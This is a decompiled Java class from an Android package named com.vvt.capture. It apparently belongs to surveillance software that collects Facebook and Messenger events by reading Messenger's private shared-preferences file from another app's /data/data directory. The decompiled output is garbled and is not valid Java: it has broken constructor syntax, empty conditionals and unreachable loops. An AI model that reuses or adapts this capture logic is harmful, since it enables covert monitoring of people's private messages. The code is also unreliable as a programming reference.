package com.vvt.capture.b.a;

import com.vvt.base.b;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.b.d;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class h
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private b d;
  
  public h(String paramString, b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  private boolean b()
  {
    Object localObject = a.a();
    Iterator localIterator = ((List)localObject).iterator();
    do
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      localObject = (String)localIterator.next();
      File localFile = new java/io/File;
      localFile.<init>((String)localObject);
      bool = localFile.exists();
    } while (!bool);
    boolean bool = true;
    for (;;)
    {
      return bool;
      bool = false;
      localObject = null;
    }
  }
  
  public g a()
  {
    bool1 = a;
    if (bool1) {}
    localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    l1 = System.currentTimeMillis();
    long l2 = 10000L;
    l1 -= l2;
    try
    {
      boolean bool2 = b();
      if (bool2)
      {
        localObject = a.b();
        if (localObject != null) {
          l1 = ((d)localObject).h();
        }
      }
      Object localObject = Long.valueOf(l1);
      localFxSimpleEventReference.setReference((Long)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Long localLong = Long.valueOf(l1);
        localFxSimpleEventReference.setReference(localLong);
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localFxSimpleEventReference;
  }
  
  public List a(int paramInt)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = "com.facebook.katana";
    try
    {
      localObject1 = a.a((String)localObject1);
      Object localObject2 = "com.facebook.orca";
      localObject2 = a.a((String)localObject2);
      d locald = a.a(paramInt, (String)localObject1, (String)localObject2);
      localObject2 = a.a((String)localObject1, (String)localObject2);
      if ((locald != null) && (localObject2 != null))
      {
        long l1 = locald.h();
        long l2 = 1L;
        l1 -= l2;
        l2 = ((d)localObject2).h();
        localObject1 = "/data/data/%s/shared_prefs/com.facebook.orca_preferences.xml";
        int i = 1;
        Object[] arrayOfObject = new Object[i];
        b localb = null;
        String str = ((d)localObject2).b();
        arrayOfObject[0] = str;
        str = String.format((String)localObject1, arrayOfObject);
        localObject1 = this.c;
        localObject2 = ((d)localObject2).b();
        i = -1 >>> 1;
        localb = this.d;
        localObject1 = a.a((String)localObject1, (String)localObject2, l1, l2, i, localb, str);
        localArrayList.addAll((Collection)localObject1);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = a.b();
      if (localObject1 != null)
      {
        Object localObject2 = paramg1.getReference();
        localObject2 = (Long)localObject2;
        long l1 = ((Long)localObject2).longValue();
        localObject2 = paramg2.getReference();
        localObject2 = (Long)localObject2;
        long l2 = ((Long)localObject2).longValue();
        localObject2 = "/data/data/%s/shared_prefs/com.facebook.orca_preferences.xml";
        int i = 1;
        Object[] arrayOfObject = new Object[i];
        b localb = null;
        String str = ((d)localObject1).b();
        arrayOfObject[0] = str;
        str = String.format((String)localObject2, arrayOfObject);
        localObject2 = this.c;
        localObject1 = ((d)localObject1).b();
        i = -1 >>> 1;
        localb = this.d;
        localObject2 = a.a((String)localObject2, (String)localObject1, l1, l2, i, localb, str);
        localArrayList.addAll((Collection)localObject2);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = b;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/removeFromPath/a/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */